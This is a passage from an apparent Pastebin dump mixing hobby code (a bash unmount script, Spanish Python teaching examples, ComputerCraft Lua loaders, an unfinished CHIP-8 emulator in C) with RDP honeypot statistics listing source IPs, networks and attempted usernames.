# SD cards. For some reason it gets automatically remounted sometimes,
# appending higher and higher numbers to the name of the mountpoint. So
# this script will unmount all the ones except the first one.

regex=""^\/run\/media\/${USER}\/SD_BTRFS([0-9]+)$""

mapfile -t lines < <(mount -t btrfs)

for (( i = 0; i < ${#lines[@]}; i++ )); do
	line=""${lines[${i}]}""

	mapfile -d' ' -t line_parts <<<""$line""
	line_parts[-1]=""${line_parts[-1]%$'\n'}""

	dev=""${line_parts[0]}""
	mnt_pt=""${line_parts[2]}""

	if [[ ! -b $dev ]]; then
		continue
	fi

	if [[ $mnt_pt =~ $regex ]]; then
		printf '\n%s\n' ""${mnt_pt}: unmounting...""
		sudo umount ""$mnt_pt""
	fi
done

printf '\n'
"
E3F9FFww,form tkinter,teslariu,Python,Wednesday 28th of June 2023 07:46:08 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
import tkinter as tk
import pprint

def guardar_datos():
    global personas
    nombre = caja_nombre.get()
    email = caja_email.get()
    nac = caja_nac.get()
    datos = {""nombre"": nombre, ""email"": email, ""nac"":nac}
    personas.append(datos)
    print()
    pprint.pprint(personas)
    # borro el formulario
    caja_email.delete(0,tk.END)
    caja_nac.delete(0,tk.END)
    caja_nombre.delete(0,tk.END)


"""""" 
Estructura de datos
personas = [
        {""nombre"":""Juan"", ""email"":""juan@gmail.com"", ""nacionalidad"":""argentino""},
        {""nombre"":""Ana"", ""email"":""ana@gmail.com"", ""nacionalidad"":""argentina""},
    ]
""""""
personas = []

ventana = tk.Tk()  # creo una ventana gráfica
ventana.title(""Formulario"")
ventana.config(width=350, height=300)
ventana.resizable(False, False)  # evita redimensionar la ventana

# campo de nombre
etiqueta = tk.Label(text=""Nombre"")
etiqueta.place(x=10, y=20)
caja_nombre = tk.Entry()
caja_nombre.place(x=100, y=20, width=200, height=25)

# campo de email
etiqueta = tk.Label(text=""Email"")
etiqueta.place(x=10, y=80)
caja_email = tk.Entry()
caja_email.place(x=100, y=80, width=200, height=25)


# campo de nacionalidad
etiqueta = tk.Label(text=""Nacionalidad"")
etiqueta.place(x=10, y=140)
caja_nac = tk.Entry()
caja_nac.place(x=100, y=140, width=200, height=25)

boton = tk.Button(text=""Guardar"", command=guardar_datos)
boton.place(x=140, y=200, width=100, height=40)


ventana.mainloop()




"
S2mhvkhA,WirelessTurtleControl,goldfiction,Lua,Wednesday 28th of June 2023 07:37:04 PM CDT,"shell.run(""pastebin get rEVVchSc WTC"")
shell.run(""pastebin get 7eSdXM1b slave"")"
aFVgvS6Z,2023-06-28_stats.json,rdp_snitch,JSON,Wednesday 28th of June 2023 07:18:18 PM CDT,"{
  ""ip"": {
    ""46.10.214.186"": 114,
    ""92.204.139.79"": 162,
    ""205.210.31.176"": 9,
    ""114.217.18.245"": 102,
    ""185.66.228.185"": 57,
    ""125.74.93.228"": 147,
    ""120.71.0.5"": 96,
    ""20.42.101.211"": 123,
    ""69.58.124.234"": 123,
    ""51.75.160.42"": 12,
    ""120.132.17.153"": 18,
    ""87.251.64.110"": 12,
    ""36.108.169.132"": 105,
    ""194.165.16.10"": 6,
    ""168.138.149.190"": 48,
    ""87.251.75.145"": 12,
    ""178.21.163.70"": 24,
    ""152.89.198.133"": 12,
    ""62.122.184.165"": 12,
    ""162.221.192.26"": 12,
    ""45.83.65.60"": 3,
    ""91.212.166.5"": 12,
    ""84.17.46.229"": 12,
    ""168.138.255.225"": 42,
    ""164.92.158.134"": 9,
    ""87.251.75.64"": 3,
    ""194.195.112.80"": 6,
    ""129.213.112.193"": 3,
    ""91.240.118.133"": 18,
    ""87.251.75.120"": 3,
    ""194.165.16.11"": 6,
    ""185.170.144.3"": 6,
    ""171.22.108.115"": 3,
    ""139.177.182.196"": 3,
    ""201.93.165.53"": 15,
    ""176.111.173.170"": 18,
    ""157.7.91.55"": 30,
    ""139.162.114.83"": 30,
    ""198.74.56.46"": 3,
    ""45.227.254.55"": 6,
    ""174.138.31.86"": 3,
    ""205.210.31.169"": 9,
    ""194.26.135.176"": 9,
    ""103.68.251.170"": 9,
    ""162.142.125.12"": 3,
    ""194.165.16.78"": 6,
    ""185.36.81.28"": 3,
    ""106.116.169.71"": 3,
    ""62.122.184.168"": 12,
    ""62.122.184.166"": 12,
    ""176.111.173.229"": 9,
    ""62.122.184.38"": 9,
    ""192.99.110.133"": 3,
    ""45.140.17.16"": 9,
    ""103.55.38.129"": 3,
    ""14.225.212.176"": 3,
    ""205.210.31.214"": 9,
    ""194.165.16.76"": 6,
    ""202.55.133.12"": 3
  },
  ""asn"": {
    ""AS8866"": 114,
    ""AS398108"": 162,
    ""AS396982"": 27,
    ""AS4134"": 105,
    ""AS201689"": 57,
    ""AS141998"": 147,
    ""AS137695"": 201,
    ""AS8075"": 123,
    ""AS32899"": 123,
    ""AS16276"": 15,
    ""AS140292"": 18,
    ""AS48080"": 18,
    ""AS48721"": 24,
    ""AS31898"": 93,
    ""AS208091"": 18,
    ""AS21419"": 24,
    ""AS57523"": 84,
    ""AS21859"": 12,
    ""AS208843"": 3,
    ""AS198953"": 21,
    ""AS60068"": 12,
    ""AS14061"": 12,
    ""AS63949"": 42,
    ""AS35913"": 3,
    ""AS27699"": 15,
    ""AS213010"": 27,
    ""AS7506"": 30,
    ""AS267784"": 6,
    ""AS135905"": 12,
    ""AS398324"": 3,
    ""AS209605"": 3,
    ""AS136052"": 3,
    ""AS63737"": 3
  },
  ""isp"": {
    ""Vivacom Bulgaria EAD"": 114,
    ""GoDaddy.com, LLC"": 162,
    ""Google LLC"": 27,
    ""Chinanet"": 105,
    ""Lamerd Information & Communication Technology Co., ltd"": 57,
    ""China Telecom"": 147,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 201,
    ""Microsoft Corporation"": 123,
    ""Bresco Broadband"": 123,
    ""OVH SAS"": 15,
    ""Addresses CNNIC"": 18,
    ""Dmitriy Panchenko"": 18,
    ""Flyservers S.A."": 30,
    ""Oracle Corporation"": 93,
    ""XHOST-INTERNET-SOLUTIONS"": 18,
    ""Pishtaze E Jadid Infomration Company"": 24,
    ""Chang Way Technologies Co. Limited"": 84,
    ""Zenlayer Inc"": 12,
    ""INTERNET-RESEARCH"": 3,
    ""Proton66 OOO"": 21,
    ""DataCamp Limited"": 12,
    ""DigitalOcean, LLC"": 12,
    ""Akamai Technologies, Inc."": 42,
    ""DediPath"": 3,
    ""Vivo"": 15,
    ""GigaHostingServices OU"": 27,
    ""GMO Internet, Inc"": 30,
    ""POWERNET"": 9,
    ""Censys, Inc."": 3,
    ""SERVEROFFER LT"": 3,
    ""PT Cloud Hosting Indonesia"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Vietserver Services Technology Company Limited"": 3
  },
  ""org"": {
    ""Bulgarian Telecommunications Company Plc"": 114,
    ""Unknown"": 267,
    ""Palo Alto Networks, Inc"": 27,
    ""Chinanet JS"": 102,
    ""Chinanet GS"": 147,
    ""Chinanet XJ"": 96,
    ""Microsoft Azure Cloud (eastus)"": 123,
    ""Bresco Broadband"": 123,
    ""OVH Ltd"": 12,
    ""Xhost Internet Solutions"": 30,
    ""Chinanet ZJ"": 105,
    ""Flyservers S.A"": 24,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 90,
    ""Starcrecium Limited"": 12,
    ""Chang Way Technologies Co. Limited"": 72,
    ""ZENLA"": 12,
    ""Proton66 LLC"": 21,
    ""Cdn77 AMS"": 12,
    ""DigitalOcean, LLC"": 12,
    ""Linode"": 12,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 3,
    ""Xhostis"": 6,
    ""DediPath"": 3,
    ""TELEF\ufffdNICA BRASIL S.A"": 15,
    ""GigaHostingServices OU"": 27,
    ""GMO Internet, Inc."": 30,
    ""Linode, LLC"": 30,
    ""UAB Host Baltic"": 6,
    ""PowerNet Company Limited"": 9,
    ""Censys Inc"": 3,
    ""Chinanet HE"": 3,
    ""AVAST Software"": 3,
    ""PT Cloud Hosting Indonesia"": 3,
    ""VNPT"": 3,
    ""VietServer Services technology company limited"": 3
  },
  ""regionName"": {
    ""Sofia-Capital"": 114,
    ""Virginia"": 288,
    ""California"": 27,
    ""Jiangsu"": 102,
    ""Tehran"": 81,
    ""Gansu"": 147,
    ""Xinjiang Uyghur Autonomous Region"": 96,
    ""Ohio"": 123,
    ""England"": 12,
    ""Beijing"": 18,
    ""Moscow"": 117,
    ""Zhejiang"": 105,
    ""Kaunas"": 27,
    ""Sao Paulo"": 105,
    ""North Holland"": 45,
    ""Texas"": 12,
    ""Land Berlin"": 3,
    ""Maharashtra"": 6,
    ""New York"": 3,
    ""Hesse"": 3,
    ""Mazovia"": 27,
    ""Tokyo"": 60,
    ""New Jersey"": 3,
    ""Vilnius"": 6,
    ""South West"": 3,
    ""Da Nang"": 9,
    ""Michigan"": 3,
    ""Hebei"": 3,
    ""Quebec"": 3,
    ""West Java"": 3,
    ""Hanoi"": 6
  },
  ""country"": {
    ""Bulgaria"": 114,
    ""United States"": 459,
    ""China"": 471,
    ""Iran"": 81,
    ""United Kingdom"": 12,
    ""Russia"": 117,
    ""Lithuania"": 33,
    ""Brazil"": 105,
    ""Netherlands"": 45,
    ""Germany"": 6,
    ""India"": 6,
    ""Poland"": 27,
    ""Japan"": 60,
    ""Singapore"": 3,
    ""Vietnam"": 15,
    ""Canada"": 3,
    ""Indonesia"": 3
  },
  ""account"": {
    ""142.93.8.59"": 1176,
    ""KvHSmXQKM"": 3,
    ""PhvTzp"": 3,
    ""uRoBwk"": 3,
    ""Test"": 54,
    ""Domain"": 117,
    ""Administr"": 36,
    ""quk5gj4f"": 12,
    ""user"": 3,
    ""hello"": 126,
    ""(empty)"": 9,
    ""VWWDTfLln"": 3,
    ""IVxlmo"": 3,
    ""mCzJSV"": 3,
    ""nFTVWNoty"": 3,
    ""diCnXt"": 3,
    ""RIQziw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1560
  },
  ""client_build"": {
    ""Unknown"": 1560
  },
  ""client_name"": {
    ""Unknown"": 1560
  },
  ""ip_type"": {
    ""Unknown"": 1116,
    ""hosting"": 357,
    ""mobile"": 42,
    ""proxy"": 30,
    ""hosting & proxy"": 15
  }
}"
D69h33zP,2023-06-28_stats.json,rdp_snitch,JSON,Wednesday 28th of June 2023 07:16:19 PM CDT,"{
  ""ip"": {
    ""46.10.214.186"": 76,
    ""92.204.139.79"": 108,
    ""205.210.31.176"": 6,
    ""114.217.18.245"": 68,
    ""185.66.228.185"": 38,
    ""125.74.93.228"": 98,
    ""120.71.0.5"": 64,
    ""20.42.101.211"": 82,
    ""69.58.124.234"": 82,
    ""51.75.160.42"": 8,
    ""120.132.17.153"": 12,
    ""87.251.64.110"": 8,
    ""36.108.169.132"": 70,
    ""194.165.16.10"": 4,
    ""168.138.149.190"": 32,
    ""87.251.75.145"": 8,
    ""178.21.163.70"": 16,
    ""152.89.198.133"": 8,
    ""62.122.184.165"": 8,
    ""162.221.192.26"": 8,
    ""45.83.65.60"": 2,
    ""91.212.166.5"": 8,
    ""84.17.46.229"": 8,
    ""168.138.255.225"": 28,
    ""164.92.158.134"": 6,
    ""87.251.75.64"": 2,
    ""194.195.112.80"": 4,
    ""129.213.112.193"": 2,
    ""91.240.118.133"": 12,
    ""87.251.75.120"": 2,
    ""194.165.16.11"": 4,
    ""185.170.144.3"": 4,
    ""171.22.108.115"": 2,
    ""139.177.182.196"": 2,
    ""201.93.165.53"": 10,
    ""176.111.173.170"": 12,
    ""157.7.91.55"": 20,
    ""139.162.114.83"": 20,
    ""198.74.56.46"": 2,
    ""45.227.254.55"": 4,
    ""174.138.31.86"": 2,
    ""205.210.31.169"": 6,
    ""194.26.135.176"": 6,
    ""103.68.251.170"": 6,
    ""162.142.125.12"": 2,
    ""194.165.16.78"": 4,
    ""185.36.81.28"": 2,
    ""106.116.169.71"": 2,
    ""62.122.184.168"": 8,
    ""62.122.184.166"": 8,
    ""176.111.173.229"": 6,
    ""62.122.184.38"": 6,
    ""192.99.110.133"": 2,
    ""45.140.17.16"": 6,
    ""103.55.38.129"": 2,
    ""14.225.212.176"": 2,
    ""205.210.31.214"": 6,
    ""194.165.16.76"": 4,
    ""202.55.133.12"": 2
  },
  ""asn"": {
    ""AS8866"": 76,
    ""AS398108"": 108,
    ""AS396982"": 18,
    ""AS4134"": 70,
    ""AS201689"": 38,
    ""AS141998"": 98,
    ""AS137695"": 134,
    ""AS8075"": 82,
    ""AS32899"": 82,
    ""AS16276"": 10,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS48721"": 16,
    ""AS31898"": 62,
    ""AS208091"": 12,
    ""AS21419"": 16,
    ""AS57523"": 56,
    ""AS21859"": 8,
    ""AS208843"": 2,
    ""AS198953"": 14,
    ""AS60068"": 8,
    ""AS14061"": 8,
    ""AS63949"": 28,
    ""AS35913"": 2,
    ""AS27699"": 10,
    ""AS213010"": 18,
    ""AS7506"": 20,
    ""AS267784"": 4,
    ""AS135905"": 8,
    ""AS398324"": 2,
    ""AS209605"": 2,
    ""AS136052"": 2,
    ""AS63737"": 2
  },
  ""isp"": {
    ""Vivacom Bulgaria EAD"": 76,
    ""GoDaddy.com, LLC"": 108,
    ""Google LLC"": 18,
    ""Chinanet"": 70,
    ""Lamerd Information & Communication Technology Co., ltd"": 38,
    ""China Telecom"": 98,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 134,
    ""Microsoft Corporation"": 82,
    ""Bresco Broadband"": 82,
    ""OVH SAS"": 10,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""Flyservers S.A."": 20,
    ""Oracle Corporation"": 62,
    ""XHOST-INTERNET-SOLUTIONS"": 12,
    ""Pishtaze E Jadid Infomration Company"": 16,
    ""Chang Way Technologies Co. Limited"": 56,
    ""Zenlayer Inc"": 8,
    ""INTERNET-RESEARCH"": 2,
    ""Proton66 OOO"": 14,
    ""DataCamp Limited"": 8,
    ""DigitalOcean, LLC"": 8,
    ""Akamai Technologies, Inc."": 28,
    ""DediPath"": 2,
    ""Vivo"": 10,
    ""GigaHostingServices OU"": 18,
    ""GMO Internet, Inc"": 20,
    ""POWERNET"": 6,
    ""Censys, Inc."": 2,
    ""SERVEROFFER LT"": 2,
    ""PT Cloud Hosting Indonesia"": 2,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Vietserver Services Technology Company Limited"": 2
  },
  ""org"": {
    ""Bulgarian Telecommunications Company Plc"": 76,
    ""Unknown"": 178,
    ""Palo Alto Networks, Inc"": 18,
    ""Chinanet JS"": 68,
    ""Chinanet GS"": 98,
    ""Chinanet XJ"": 64,
    ""Microsoft Azure Cloud (eastus)"": 82,
    ""Bresco Broadband"": 82,
    ""OVH Ltd"": 8,
    ""Xhost Internet Solutions"": 20,
    ""Chinanet ZJ"": 70,
    ""Flyservers S.A"": 16,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 60,
    ""Starcrecium Limited"": 8,
    ""Chang Way Technologies Co. Limited"": 48,
    ""ZENLA"": 8,
    ""Proton66 LLC"": 14,
    ""Cdn77 AMS"": 8,
    ""DigitalOcean, LLC"": 8,
    ""Linode"": 8,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 2,
    ""Xhostis"": 4,
    ""DediPath"": 2,
    ""TELEF\ufffdNICA BRASIL S.A"": 10,
    ""GigaHostingServices OU"": 18,
    ""GMO Internet, Inc."": 20,
    ""Linode, LLC"": 20,
    ""UAB Host Baltic"": 4,
    ""PowerNet Company Limited"": 6,
    ""Censys Inc"": 2,
    ""Chinanet HE"": 2,
    ""AVAST Software"": 2,
    ""PT Cloud Hosting Indonesia"": 2,
    ""VNPT"": 2,
    ""VietServer Services technology company limited"": 2
  },
  ""regionName"": {
    ""Sofia-Capital"": 76,
    ""Virginia"": 192,
    ""California"": 18,
    ""Jiangsu"": 68,
    ""Tehran"": 54,
    ""Gansu"": 98,
    ""Xinjiang Uyghur Autonomous Region"": 64,
    ""Ohio"": 82,
    ""England"": 8,
    ""Beijing"": 12,
    ""Moscow"": 78,
    ""Zhejiang"": 70,
    ""Kaunas"": 18,
    ""Sao Paulo"": 70,
    ""North Holland"": 30,
    ""Texas"": 8,
    ""Land Berlin"": 2,
    ""Maharashtra"": 4,
    ""New York"": 2,
    ""Hesse"": 2,
    ""Mazovia"": 18,
    ""Tokyo"": 40,
    ""New Jersey"": 2,
    ""Vilnius"": 4,
    ""South West"": 2,
    ""Da Nang"": 6,
    ""Michigan"": 2,
    ""Hebei"": 2,
    ""Quebec"": 2,
    ""West Java"": 2,
    ""Hanoi"": 4
  },
  ""country"": {
    ""Bulgaria"": 76,
    ""United States"": 306,
    ""China"": 314,
    ""Iran"": 54,
    ""United Kingdom"": 8,
    ""Russia"": 78,
    ""Lithuania"": 22,
    ""Brazil"": 70,
    ""Netherlands"": 30,
    ""Germany"": 4,
    ""India"": 4,
    ""Poland"": 18,
    ""Japan"": 40,
    ""Singapore"": 2,
    ""Vietnam"": 10,
    ""Canada"": 2,
    ""Indonesia"": 2
  },
  ""account"": {
    ""142.93.8.59"": 784,
    ""KvHSmXQKM"": 2,
    ""PhvTzp"": 2,
    ""uRoBwk"": 2,
    ""Test"": 36,
    ""Domain"": 78,
    ""Administr"": 24,
    ""quk5gj4f"": 8,
    ""user"": 2,
    ""hello"": 84,
    ""(empty)"": 6,
    ""VWWDTfLln"": 2,
    ""IVxlmo"": 2,
    ""mCzJSV"": 2,
    ""nFTVWNoty"": 2,
    ""diCnXt"": 2,
    ""RIQziw"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1040
  },
  ""client_build"": {
    ""Unknown"": 1040
  },
  ""client_name"": {
    ""Unknown"": 1040
  },
  ""ip_type"": {
    ""Unknown"": 744,
    ""hosting"": 238,
    ""mobile"": 28,
    ""proxy"": 20,
    ""hosting & proxy"": 10
  }
}"
XgydLGJq,2023-06-28_stats.json,rdp_snitch,JSON,Wednesday 28th of June 2023 07:15:09 PM CDT,"{
  ""ip"": {
    ""46.10.214.186"": 38,
    ""92.204.139.79"": 54,
    ""205.210.31.176"": 3,
    ""114.217.18.245"": 34,
    ""185.66.228.185"": 19,
    ""125.74.93.228"": 49,
    ""120.71.0.5"": 32,
    ""20.42.101.211"": 41,
    ""69.58.124.234"": 41,
    ""51.75.160.42"": 4,
    ""120.132.17.153"": 6,
    ""87.251.64.110"": 4,
    ""36.108.169.132"": 35,
    ""194.165.16.10"": 2,
    ""168.138.149.190"": 16,
    ""87.251.75.145"": 4,
    ""178.21.163.70"": 8,
    ""152.89.198.133"": 4,
    ""62.122.184.165"": 4,
    ""162.221.192.26"": 4,
    ""45.83.65.60"": 1,
    ""91.212.166.5"": 4,
    ""84.17.46.229"": 4,
    ""168.138.255.225"": 14,
    ""164.92.158.134"": 3,
    ""87.251.75.64"": 1,
    ""194.195.112.80"": 2,
    ""129.213.112.193"": 1,
    ""91.240.118.133"": 6,
    ""87.251.75.120"": 1,
    ""194.165.16.11"": 2,
    ""185.170.144.3"": 2,
    ""171.22.108.115"": 1,
    ""139.177.182.196"": 1,
    ""201.93.165.53"": 5,
    ""176.111.173.170"": 6,
    ""157.7.91.55"": 10,
    ""139.162.114.83"": 10,
    ""198.74.56.46"": 1,
    ""45.227.254.55"": 2,
    ""174.138.31.86"": 1,
    ""205.210.31.169"": 3,
    ""194.26.135.176"": 3,
    ""103.68.251.170"": 3,
    ""162.142.125.12"": 1,
    ""194.165.16.78"": 2,
    ""185.36.81.28"": 1,
    ""106.116.169.71"": 1,
    ""62.122.184.168"": 4,
    ""62.122.184.166"": 4,
    ""176.111.173.229"": 3,
    ""62.122.184.38"": 3,
    ""192.99.110.133"": 1,
    ""45.140.17.16"": 3,
    ""103.55.38.129"": 1,
    ""14.225.212.176"": 1,
    ""205.210.31.214"": 3,
    ""194.165.16.76"": 2,
    ""202.55.133.12"": 1
  },
  ""asn"": {
    ""AS8866"": 38,
    ""AS398108"": 54,
    ""AS396982"": 9,
    ""AS4134"": 35,
    ""AS201689"": 19,
    ""AS141998"": 49,
    ""AS137695"": 67,
    ""AS8075"": 41,
    ""AS32899"": 41,
    ""AS16276"": 5,
    ""AS140292"": 6,
    ""AS48080"": 6,
    ""AS48721"": 8,
    ""AS31898"": 31,
    ""AS208091"": 6,
    ""AS21419"": 8,
    ""AS57523"": 28,
    ""AS21859"": 4,
    ""AS208843"": 1,
    ""AS198953"": 7,
    ""AS60068"": 4,
    ""AS14061"": 4,
    ""AS63949"": 14,
    ""AS35913"": 1,
    ""AS27699"": 5,
    ""AS213010"": 9,
    ""AS7506"": 10,
    ""AS267784"": 2,
    ""AS135905"": 4,
    ""AS398324"": 1,
    ""AS209605"": 1,
    ""AS136052"": 1,
    ""AS63737"": 1
  },
  ""isp"": {
    ""Vivacom Bulgaria EAD"": 38,
    ""GoDaddy.com, LLC"": 54,
    ""Google LLC"": 9,
    ""Chinanet"": 35,
    ""Lamerd Information & Communication Technology Co., ltd"": 19,
    ""China Telecom"": 49,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 67,
    ""Microsoft Corporation"": 41,
    ""Bresco Broadband"": 41,
    ""OVH SAS"": 5,
    ""Addresses CNNIC"": 6,
    ""Dmitriy Panchenko"": 6,
    ""Flyservers S.A."": 10,
    ""Oracle Corporation"": 31,
    ""XHOST-INTERNET-SOLUTIONS"": 6,
    ""Pishtaze E Jadid Infomration Company"": 8,
    ""Chang Way Technologies Co. Limited"": 28,
    ""Zenlayer Inc"": 4,
    ""INTERNET-RESEARCH"": 1,
    ""Proton66 OOO"": 7,
    ""DataCamp Limited"": 4,
    ""DigitalOcean, LLC"": 4,
    ""Akamai Technologies, Inc."": 14,
    ""DediPath"": 1,
    ""Vivo"": 5,
    ""GigaHostingServices OU"": 9,
    ""GMO Internet, Inc"": 10,
    ""POWERNET"": 3,
    ""Censys, Inc."": 1,
    ""SERVEROFFER LT"": 1,
    ""PT Cloud Hosting Indonesia"": 1,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Vietserver Services Technology Company Limited"": 1
  },
  ""org"": {
    ""Bulgarian Telecommunications Company Plc"": 38,
    ""Unknown"": 89,
    ""Palo Alto Networks, Inc"": 9,
    ""Chinanet JS"": 34,
    ""Chinanet GS"": 49,
    ""Chinanet XJ"": 32,
    ""Microsoft Azure Cloud (eastus)"": 41,
    ""Bresco Broadband"": 41,
    ""OVH Ltd"": 4,
    ""Xhost Internet Solutions"": 10,
    ""Chinanet ZJ"": 35,
    ""Flyservers S.A"": 8,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 30,
    ""Starcrecium Limited"": 4,
    ""Chang Way Technologies Co. Limited"": 24,
    ""ZENLA"": 4,
    ""Proton66 LLC"": 7,
    ""Cdn77 AMS"": 4,
    ""DigitalOcean, LLC"": 4,
    ""Linode"": 4,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 1,
    ""Xhostis"": 2,
    ""DediPath"": 1,
    ""TELEF\ufffdNICA BRASIL S.A"": 5,
    ""GigaHostingServices OU"": 9,
    ""GMO Internet, Inc."": 10,
    ""Linode, LLC"": 10,
    ""UAB Host Baltic"": 2,
    ""PowerNet Company Limited"": 3,
    ""Censys Inc"": 1,
    ""Chinanet HE"": 1,
    ""AVAST Software"": 1,
    ""PT Cloud Hosting Indonesia"": 1,
    ""VNPT"": 1,
    ""VietServer Services technology company limited"": 1
  },
  ""regionName"": {
    ""Sofia-Capital"": 38,
    ""Virginia"": 96,
    ""California"": 9,
    ""Jiangsu"": 34,
    ""Tehran"": 27,
    ""Gansu"": 49,
    ""Xinjiang Uyghur Autonomous Region"": 32,
    ""Ohio"": 41,
    ""England"": 4,
    ""Beijing"": 6,
    ""Moscow"": 39,
    ""Zhejiang"": 35,
    ""Kaunas"": 9,
    ""Sao Paulo"": 35,
    ""North Holland"": 15,
    ""Texas"": 4,
    ""Land Berlin"": 1,
    ""Maharashtra"": 2,
    ""New York"": 1,
    ""Hesse"": 1,
    ""Mazovia"": 9,
    ""Tokyo"": 20,
    ""New Jersey"": 1,
    ""Vilnius"": 2,
    ""South West"": 1,
    ""Da Nang"": 3,
    ""Michigan"": 1,
    ""Hebei"": 1,
    ""Quebec"": 1,
    ""West Java"": 1,
    ""Hanoi"": 2
  },
  ""country"": {
    ""Bulgaria"": 38,
    ""United States"": 153,
    ""China"": 157,
    ""Iran"": 27,
    ""United Kingdom"": 4,
    ""Russia"": 39,
    ""Lithuania"": 11,
    ""Brazil"": 35,
    ""Netherlands"": 15,
    ""Germany"": 2,
    ""India"": 2,
    ""Poland"": 9,
    ""Japan"": 20,
    ""Singapore"": 1,
    ""Vietnam"": 5,
    ""Canada"": 1,
    ""Indonesia"": 1
  },
  ""account"": {
    ""142.93.8.59"": 392,
    ""KvHSmXQKM"": 1,
    ""PhvTzp"": 1,
    ""uRoBwk"": 1,
    ""Test"": 18,
    ""Domain"": 39,
    ""Administr"": 12,
    ""quk5gj4f"": 4,
    ""user"": 1,
    ""hello"": 42,
    ""(empty)"": 3,
    ""VWWDTfLln"": 1,
    ""IVxlmo"": 1,
    ""mCzJSV"": 1,
    ""nFTVWNoty"": 1,
    ""diCnXt"": 1,
    ""RIQziw"": 1
  },
  ""keyboard"": {
    ""Unknown"": 520
  },
  ""client_build"": {
    ""Unknown"": 520
  },
  ""client_name"": {
    ""Unknown"": 520
  },
  ""ip_type"": {
    ""Unknown"": 372,
    ""hosting"": 119,
    ""mobile"": 14,
    ""proxy"": 10,
    ""hosting & proxy"": 5
  }
}"
D8g71eq3,flexico,goldfiction,Lua,Wednesday 28th of June 2023 07:05:09 PM CDT,"-- flexico
pastebin get LEHQExFi flex.lua
pastebin get eGkHs4Kk dig.lua
pastebin get pEHirhY0 quarry.lua
pastebin get Jkd18h5j stairs.lua"
FDZ4ejCr,ejemplo de ingreso de datos,teslariu,Python,Wednesday 28th of June 2023 06:39:34 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Script que pide un nombre y una edad y bromea
# >> Ingrese su nombre: Carlos
# >> Ingrese su edad: 33
# >> Hola Carlos, usted tiene 33 años de edad pero parece de 66

from temp import ingresar

nombre = input(""Ingrese su nombre: "")
edad = ingresar(""edad"")"
FQ7AfzYy,codigo template while,teslariu,Python,Wednesday 28th of June 2023 06:38:12 PM CDT,"# !/usr/bin/env python
# -*- coding: utf-8 -*-
# Turing : 
# 1) funciones computables: son funciones matematicas
#    que se puede computar automaticamente --> COMPUTADORA
# 2) maquina de Turing: demostro que se podía construir una 
#     computadora
# 3) Demuestra que las funciones computables se pueden descomponer
#    como un condicional (if) un bucle indefinido (while) y un 
#    bucle definido (for)
# 4) Los lenguajes de prog que cumplen el punto 3 se llaman
#    Turing completos y son de propósito general

# script que imprime los cuadrados y cubos de los enteros del 1 # al 10

# templates o plantillas

# Script que convierte temp de ºC a ºF y viceversa
import os
import time
                            

def menu():
    return """"""
    Conversión de temperatura
    -------------------------
    1. ºC a ºF
    2. ºF a ºC
    3. Salir
    -------------------------
    """"""

def ingresar(valor):
    while True:
        try:
            temp = float(input(f""Ingresar {valor}: ""))
        except ValueError:
            print(""Error, debe ingresar un número"")
        else:
            return temp
    
    
def borrar_pantalla():
    if os.name == ""posix"":
        os.system(""clear"")
    else:
        os.system(""cls"")
        
def convertir_a_ºF():
    temp = ingresar(""temperatura"")
    return f""Temperatura: {temp * 1.8 + 32:.1f}ºF""
   
        
def convertir_a_ºC():
    temp = ingresar(""temperatura"")
    return f""Temperatura: {(temp - 32) / 1.8:.1f}ºF""
    
    
###############################################################    

if __name__ == '__main__':
    while True:
    
        borrar_pantalla()
        print(menu())
    
        opcion = input(""Ingrese su opción: "")
    
        if opcion == ""1"":
            print(convertir_a_ºF())
            time.sleep(3)
    
        
        elif opcion == ""2"":
            print(convertir_a_ºC())
            time.sleep(3)
     
        
        elif opcion == ""3"":
            print(""Gracias por utilizar este programa...."")
            break
     
        
        else:
            print(""Opción incorrecta..."")
            time.sleep(3)












"
MZefmuam,Chip8 memory gets corrupted,drakonite,C,Wednesday 28th of June 2023 05:07:38 PM CDT,"#include <assert.h>
#include <raylib.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define MEM_SIZE 4096
#define MEM_OFFSET 0x200

#define SCALE 10
#define SCREEN_WIDTH 64 * SCALE
#define SCREEN_HEIGHT 32 * SCALE

typedef struct {
    uint8_t *mem;    /* 4KB RAM */
    uint16_t pc;     /* Program counter, keeps track of where in memory it  */
    uint16_t *index; /* Points the locaiton in memory where the executation will
                        be happening */
    uint8_t deley_timer; /* Decrements 60 per sec */
    uint8_t sound_timer; /* Makes a beep sound if its bigger than 0 */
    uint8_t V[16];       /* general purpose variable from V0 to VF */
    uint16_t rom_size;
} chip8;

uint8_t font[][5] = {{0xF0, 0x90, 0x90, 0x90, 0xF0},  // 0
                     {0x20, 0x60, 0x20, 0x20, 0x70},  // 1
                     {0xF0, 0x10, 0xF0, 0x80, 0xF0},  // 2
                     {0xF0, 0x10, 0xF0, 0x10, 0xF0},  // 3
                     {0x90, 0x90, 0xF0, 0x10, 0x10},  // 4
                     {0xF0, 0x80, 0xF0, 0x10, 0xF0},  // 5
                     {0xF0, 0x80, 0xF0, 0x90, 0xF0},  // 6
                     {0xF0, 0x10, 0x20, 0x40, 0x40},  // 7
                     {0xF0, 0x90, 0xF0, 0x90, 0xF0},  // 8
                     {0xF0, 0x90, 0xF0, 0x10, 0xF0},  // 9
                     {0xF0, 0x90, 0xF0, 0x90, 0x90},  // A
                     {0xE0, 0x90, 0xE0, 0x90, 0xE0},  // B
                     {0xF0, 0x80, 0x80, 0x80, 0xF0},  // C
                     {0xE0, 0x90, 0x90, 0x90, 0xE0},  // D
